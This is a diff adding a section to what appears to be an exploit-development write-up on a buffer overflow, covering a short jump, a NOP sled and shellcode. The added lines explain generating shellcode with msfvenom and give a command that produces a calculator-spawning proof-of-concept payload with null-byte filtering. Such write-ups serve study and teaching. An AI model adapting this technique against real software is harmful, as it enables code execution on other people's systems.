@@ -94,6 +94,12 @@ Including the NOPSLED  after our short jump, will allow for a clean Shell Code e
 +----------------------+
 ```
 
+## Shellcode and putting it all together
+
+Now that we have a clean jump into a controlled area, we want to generate a  malicious shellcode payload via msfvenom, as for this proof-of-concept and this vulnerable application being a local based exploitation. to prove the code execution properties of this technique, we can generate a shellcode payload that spawns a calculator. 
+
+`./msfvenom -p windows/exec CMD=calc.exe -b '\x00' -f c EXITFUNC=thread`
+
 Our final payload is as seen below.
 
 ```python
